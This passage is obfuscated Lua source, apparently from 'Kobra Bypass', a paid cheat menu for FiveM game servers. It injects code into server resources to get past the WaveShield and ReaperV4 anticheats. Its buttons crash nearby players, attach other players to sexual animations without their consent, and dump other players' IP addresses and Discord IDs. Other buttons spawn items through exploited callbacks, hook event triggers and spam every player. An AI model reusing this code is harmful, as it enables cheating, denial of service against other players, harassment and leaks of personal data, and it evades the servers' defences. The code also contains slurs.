                                                if KpLoMkNjBhGt(veh) then
                                                    JkLzXcVbNmAs(veh, 100.0)
                                                end
                                            end
                                            Wait(100)
                                        end
                                    end)
                                end

                                LqWyXpR3tV()
                                ]]);break;end end else local v625=266 -(38 + 228) ;while true do if (v625==0) then v12:Notify("error","Kobra","Unlimited Fuel Off",5449 -2449 );v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                BlNkJmLzXcVb = false
                                ]]);break;end end end end}}}}},{icon="",label="Emotes",type="subMenu",categories={{label="Emote Menu",tabs={{type="button",label="Detach All Entitys",onSelect=function() local v471=1862 -(354 + 1508) ;while true do if ((0 -0)==v471) then print("dih");MachoInjectResourceRaw("any",[[
                            local function zXqLJWt7pN()
                                local xPvA71LtqzW = ClearPedTasks
                                local bXcT2mpqR9f = DetachEntity

                                xPvA71LtqzW(PlayerPedId())
                                bXcT2mpqR9f(PlayerPedId())
                            end

                            zXqLJWt7pN()
                            ]]);break;end end end},{type="divider",label="Emotes"},{type="button",label="Twerk On Them",onSelect=function() local v472={};for v566,v567 in pairs(v27) do if v567 then v472[ #v472 + (1 -0) ]=v566;end end if ( #v472==0) then local v626=1244 -(334 + 910) ;while true do if ((895 -(92 + 803))==v626) then v275:Notify("error","Kobra","You must select a player first!",3000);return;end end end for v568,v569 in ipairs(v472) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[twerk] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[twerk] Target ped invalid.")
                                                return
                                            end

                                            -- Safety: prevent attaching twice or to yourself
                                            if targetPed == playerPed then
                                                print("[twerk] Cannot twerk on yourself.")
                                                return
                                            end

                                            if StarkDaddy then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                print("[twerk] Stopped twerking.")
                                                return
                                            end

                                            StarkDaddy = true
                                            local dict = "switch@trevor@mocks_lapdance"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[twerk] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Safety checks before attaching
                                            if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                                print("[twerk] One of the peds no longer exists.")
                                                return
                                            end

                                            -- Attach safely
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[twerk] Started twerking on target.")

                                            -- Watchdog to auto detach if target dies/disconnects
                                            while StarkDaddy do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    StarkDaddy = false
                                                    print("[twerk] Target disappeared — detached safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v569,v569));end v275:Notify("success","Kobra","Attempted to twerk on "   ..  #v472   .. " player(s)." ,2204 + 1796 );end},{type="divider",label="Vehicle Emotes"},{type="button",label="Blow Driver",onSelect=function() local v473={};for v570,v571 in pairs(v27) do if v571 then v473[ #v473 + 1 ]=v570;end end if ( #v473==(0 + 0)) then v275:Notify("error","Kobra","You must select a player first!",4510 -(353 + 1157) );return;end for v572,v573 in ipairs(v473) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[blowdriver] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[blowdriver] Target ped invalid.")
                                                return
                                            end

                                            -- Prevent doing animation on yourself
                                            if targetPed == playerPed then
                                                print("[blowdriver] Cannot perform on yourself.")
                                                return
                                            end

                                            if BlowDriver then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false
                                                print("[blowdriver] Stopped animation.")
                                                return
                                            end

                                            BlowDriver = true
                                            local dict = "mini@prostitutes@sexnorm_veh"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[blowdriver] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Attach to driver seat roughly where needed
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[blowdriver] Started animation on target.")

                                            -- Watchdog to auto stop if target disappears or dies
                                            while BlowDriver do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    BlowDriver = false
                                                    print("[blowdriver] Target disappeared — stopped safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v573,v573));end v275:Notify("success","Kobra","Attempted BlowDriver on "   ..  #v473   .. " player(s)." ,5114 -(53 + 1061) );end}}}}},{icon="",label="Teleports",type="subMenu",categories={{label="Teleport Menu",tabs={{type="button",label="FIB Building",onSelect=function() local v474=GetResourceState("WaveShield")=="started" ;local v475=GetResourceState("ReaperV4")=="started" ;if v474 then MachoInjectResourceRaw("WaveShield",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);elseif v475 then MachoInjectThread(0,"any","",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);end end},{type="button",label="Mission Row PD",onSelect=function() local v476=GetResourceState("WaveShield")=="started" ;local v477=GetResourceState("ReaperV4")=="started" ;if v476 then MachoInjectResourceRaw("WaveShield",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);elseif v477 then MachoInjectThread(0 -0 ,"any","",[[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);end end},{type="button",label="Pillbox Hospital",onSelect=function() local v478=GetResourceState("WaveShield")=="started" ;local v479=GetResourceState("ReaperV4")=="started" ;if v478 then MachoInjectResourceRaw("WaveShield",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);elseif v479 then MachoInjectThread(0 -0 ,"any","",[[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);end end},{type="button",label="Grove Street",onSelect=function() local v480=GetResourceState("WaveShield")=="started" ;local v481=GetResourceState("ReaperV4")=="started" ;if v480 then MachoInjectResourceRaw("WaveShield",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);elseif v481 then MachoInjectThread(0 + 0 ,"any","",[[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);end end},{type="button",label="Legion Square",onSelect=function() local v482=0 + 0 ;local v483;local v484;while true do if (v482==0) then v483=GetResourceState("WaveShield")=="started" ;v484=GetResourceState("ReaperV4")=="started" ;v482=1;end if (v482==(1 -0)) then if v483 then MachoInjectResourceRaw("WaveShield",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);elseif v484 then MachoInjectThread(0,"any","",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);else MachoInjectResourceRaw("any",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);end break;end end end}}}}},{icon="",label="Settings",type="subMenu",categories={{label="Interface",tabs={{type="subMenu",label="Keybinds",subTabs={{icon="",type="button",label="Menu Key",onSelect=function() v60("Choose Menu Key","",function(v574) for v627,v628 in pairs(v44) do if (v628:lower()==v574:lower()) then local v799=0 + 0 ;while true do if (v799==(0 + 0)) then v23=v628;Wait(250);v799=1 + 0 ;end if (v799==1) then v12:ShowUI();return;end end end end end,"keybind");end}}},{type="subMenu",label="Banners",subTabs={{icon="",type="button",label="Kobra (Default)",onSelect=function() v12:SendMessage({action="updateBanner",bannerColor="150, 0, 0",bannerLink="https://jaythaagamer.simdif.com/images/th/sd_6935ae44db1fd.png?no_cache=1765129304"});end}}},{type="scrollable",label="Menu Positioning (X)",desc="This is the menu positioning based on the X-Axis.",value=1 -0 ,values={"Left","Center","Right"},onSelect=function() print("Selected - Menu Positioning (X)");end},{type="scrollable",label="Menu Positioning (Y)",desc="This is the menu positioning based on the Y-Axis.",value=1,values={"Top","Middle","Bottom"},onSelect=function() print("Selected - Menu Positioning (Y)");end}}}}}};v17=v16;v18=nil;v19=2 -1 ;v15=1 + 0 ;end;local function v97(v276) for v485,v486 in ipairs(v16) do if (v486.label=="Server") then for v725,v726 in ipairs(v486.categories) do if (v726.label=="Triggers") then local v852=507 -(263 + 244) ;while true do if (0==v852) then v726.tabs[ #v726.tabs + 1 + 0 ]=v276;return;end end end end end end end v12.UpdateTabChecked=function(v277,v278,v279,v280) for v487,v488 in pairs(v278 or {} ) do if ((v488.label==v279) and ((v488.type=="checkbox") or (v488.type=="slider-checkbox") or v488.type:find("checkbox"))) then v488.checked=v280;elseif (v488.type=="subMenu") then local v800=1687 -(1502 + 185) ;while true do if (v800==0) then if v488.categories then for v1176,v1177 in pairs(v488.categories) do v277:UpdateTabChecked(v1177.tabs,v279,v280);end end if v488.subTabs then v277:UpdateTabChecked(v488.subTabs,v279,v280);end break;end end end end end;v12.ShowKeybindList=function(v281,v282) v281:SendMessage({action="displayBinds",visible=true,binds=v282});end;v12.HideKeybindList=function(v283) v283:SendMessage({action="displayBinds",visible=false});end;v12.GetNearbyPlayers=function(v284,v285,v286,v287) local v288={};local v289=PlayerPedId();v286=v286 or (67 + 283) ;if ( not v289 or  not DoesEntityExist(v289) or  not IsPlayerPlaying(PlayerId())) then v288={};return v288;end local v290=GetActivePlayers();if v290 then for v630,v631 in ipairs(v290) do if (v287 or (v631~=PlayerId())) then local v801=GetPlayerPed(v631);if (v801 and DoesEntityExist(v801) and IsEntityAPed(v801) and  not IsEntityDead(v801)) then local v962=GetEntityCoords(v801);if v962 then local v1115=0 -0 ;local v1116;while true do if (v1115==0) then v1116= #(v285-v962);if (v1116<=v286) then v288[ #v288 + (2 -1) ]={name=GetPlayerName(v631),serverId=GetPlayerServerId(v631)};end break;end end end end end end else local v575=1527 -(629 + 898) ;local v576;local v577;local v578;while true do if (v575==(2 -1)) then repeat local v853=0 -0 ;while true do if (v853==(365 -(12 + 353))) then if (v577 and IsPedAPlayer(v577) and DoesEntityExist(v577)) then local v1178=NetworkGetPlayerIndexFromPed(v577);if ((v1178~= -1) and (v287 or (v1178~=PlayerId()))) then local v1266=1911 -(1680 + 231) ;local v1267;while true do if (v1266==(0 + 0)) then v1267=GetEntityCoords(v577);if v1267 then local v1510=0 + 0 ;local v1511;while true do if (v1510==(1149 -(212 + 937))) then v1511= #(v285-v1267);if (v1511<=v286) then v288[ #v288 + 1 ]={name=GetPlayerName(v1178),serverId=GetPlayerServerId(v1178)};end break;end end end break;end end end end v578,v577=FindNextPed(v576);break;end end until  not v578 EndFindPed(v576);break;end if (v575==(0 + 0)) then v576,v577=FindFirstPed();v578=nil;v575=1063 -(111 + 951) ;end end end if ( #v288==0) then v288={};end return v288;end;CreateThread(function() v12:Initialize();v12:BuildDefaultMenu();v12:UpdateElements(v17);Wait(204 + 796 );v12:Notify("success","Kobra","You have loaded Kobra Bypass, welcome!",3000);Wait(1027 -(18 + 9) );v12:Notify("info","Kobra","Hello lifetime user, thanks for using Kobra Bypass!",3000);Wait(201 + 799 );v97({type="button",label="Bypass WaveShield [Risky]",onSelect=function() if (GetResourceState("WaveShield")~="started") then v12:Notify("info","Kobra","WaveShield not detected.",3534 -(31 + 503) );return;end for v579=1633 -(595 + 1037) ,1446 -(189 + 1255)  do MachoInjectResource2(3,"WaveShield",[[
                error('my nigga what happened :(')
            ]]);end v12:Notify("success","Kobra","WaveShield bypass attempted.",1109 + 1891 );end});if ((GetResourceState("ox_lib")=="started") or (GetResourceState("lb-phone")=="started") or (GetResourceState("monitor")=="started") or (GetResourceState("core")=="started") or (GetResourceState("es_extended")=="started") or (GetResourceState("qb-core")=="started") or (GetResourceState("ox_lib")=="started")) then v97({type="button",label="DeFXAP Events",onSelect=function() v12:HideUI();local v632=nil;local v633=false;v60("Resource Name","",function(v727) if (v727 and (v727~="")) then v632=v727;end v633=true;end,"typeable");while  not v633 do Wait(154 -54 );end if ( not v632 or (v632=="")) then MachoMenuNotification("Error","No resource name entered.");v12:ShowUI();return;end if (GetResourceState(v632)~="started") then local v802=1279 -(1170 + 109) ;while true do if (v802==1) then return;end if (0==v802) then MachoMenuNotification("Error","Resource ^3"   .. v632   .. "^7 is not started or doesn’t exist." );v12:ShowUI();v802=1818 -(348 + 1469) ;end end end local v634=[[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]];v48(v632,v634);MachoMenuNotification("Injector","Hooks injected into ^3"   .. v632   .. "^7 successfully!" );v12:ShowUI();end});end if (GetResourceState("ox_lib")=="started") then v97({type="button",label="CRASH NEARBY PLAYERS",onSelect=function() local v635=1289 -(1115 + 174) ;while true do if (v635==0) then if (GetResourceState("WaveShield")=="started") then v12:Notify("error","Kobra","Bahama Prevention: Can't use this on WaveShit",7316 -4316 );return;end MachoInjectResourceRaw("ox_lib",[[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
        ]]);break;end end end});end if ((GetResourceState("dpemotes")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="BRING NEARBY PLAYERS",onSelect=function() local v636=1014 -(85 + 929) ;while true do if ((0 + 0)==v636) then v12:Notify("success","Kobra","Attempting to bring all players",4867 -(1151 + 716) );MachoInjectThread(0 + 0 ,"dpemotes","",[[
                    TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
                ]]);break;end end end});end if (GetResourceState("mc9-adminmenu")=="started") then v97({type="button",label="ADMIN MENU (F8)",onSelect=function() v12:Notify("success","Kobra","Admin Menu List",2928 + 72 );MachoInjectResource2(NewThreadNs,"mc9-adminmenu",[[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                        
                        if ply.identifiers and ply.identifiers.ip then
                            print(("    IP: ^2%s"):format(ply.identifiers.ip:sub(4)))
                        else
                            print("    IP: ^1Not Available")
                        end
                        
                        if ply.identifiers and ply.identifiers.discord then
                            print(("    Discord: ^2%s"):format(ply.identifiers.discord:sub(9)))
                        else
                            print("    Discord: ^1Not Available")
                        end
                    end
                end
            ]]);end});end if (GetResourceState("mc9-mainmenu")=="started") then v97({type="button",label="MCSHIT9 ADD ITEMS",onSelect=function() local v637=0;while true do if (v637==(1704 -(95 + 1609))) then v12:Notify("success","Kobra","Spawning Items",10828 -7828 );MachoInjectResource2(NewThreadNs,"mc9-mainmenu",[[
            local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
            for i,v in pairs(data) do
                local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
            end
            ]]);break;end end end});end if (GetResourceState("vMenu")=="started") then v97({type="button",label="HIT DMS",onSelect=function() local v638=758 -(364 + 394) ;while true do if (v638==0) then v12:Notify("success","Kobra","Message Sent",3000);MachoInjectResource2(1 + 0 ,"any",[[
                    TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is repercing with Kobra Bypass, the leading cheat in the market. Join our discord at https://discord.gg/6zXK6wNu')
                ]]);break;end end end});end if (GetResourceState("amigo")=="started") then v97({type="button",label="ADD ITEM (1)",onSelect=function() v12:HideUI();local function v639(v728,v729) local v730=nil;local v731=false;v60(v728,v729 or "" ,function(v803) v730=v803;v731=true;end,"typeable");while  not v731 do Wait(0 + 0 );end return v730;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");local v640=v639("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v640));if ( not v640 or (v640=="")) then local v804=0 + 0 ;while true do if (v804==(0 + 0)) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",1507 + 1493 );v804=1;end if (v804==(1 + 0)) then v12:ShowUI();return;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");local v641=v639("Item Count","1");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v641));local v642=tonumber(v641);if ( not v642 or (v642<1)) then local v805=0 + 0 ;while true do if (v805==0) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v642=1 + 0 ;break;end end end if (v642>100000) then print("^7[^5Kobra^7] [^1WARN^7]: Count too high, clamping to 100000");v642=31553 + 68447 ;end v640=tostring(v640 or "" );v642=tonumber(v642 or (957 -(719 + 237)) );print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v640);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v642);local v643,v644=pcall(function() MachoInjectResourceRaw("amigo",string.format([[
                        -- Hook native functions safely
                        local function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            _G[nativeName] = function(...)
                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                                return newFunction(originalNative, ...)
                            end
                        end

                        HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                        HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                        _G.Kobra = {
                            TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                            TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                        }

